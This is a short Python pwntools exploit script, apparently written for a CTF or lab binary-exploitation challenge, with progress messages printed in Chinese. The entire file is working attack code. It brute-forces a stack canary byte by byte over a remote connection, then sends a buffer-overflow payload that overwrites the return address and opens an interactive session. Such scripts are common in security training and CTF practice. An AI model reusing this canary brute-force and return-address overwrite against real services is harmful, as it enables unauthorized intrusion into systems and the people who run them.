from pwn import *
# from tqdm import tqdm
context.log_level = 'debug'
# context.terminal = ['gnome-terminal','-x','bash','-c']
context.update(arch='i386', os='linux')


p = remote('192.168.170.128', 9999)
# p_main_addr = int(p.recv(8).decode(), 16)
p.recvuntil('welcome')
canary = b'\x00'
for k in range(3):
    for i in range(256):
        print("正在爆破Canary的第" + str(k+1) + "位")
        print("当前的字符为" + chr(i))
        payload = b'a' * 0x64 + canary + bytes([i])
        print("当前payload为：", payload)
        p.send(b'a' * 0x64 + canary + bytes([i]))
        data = p.recvuntil(b"welcome\n")
        print(data)
        if b"recv sucess" in data:
            canary += bytes([i])
            print("Canary is:" + str(canary))
            break

payload = b'A'*0x64 + canary
payload = payload.ljust(0x74, b'\x00')
payload += p32(0x804863B)

p.send(payload)
p.interactive()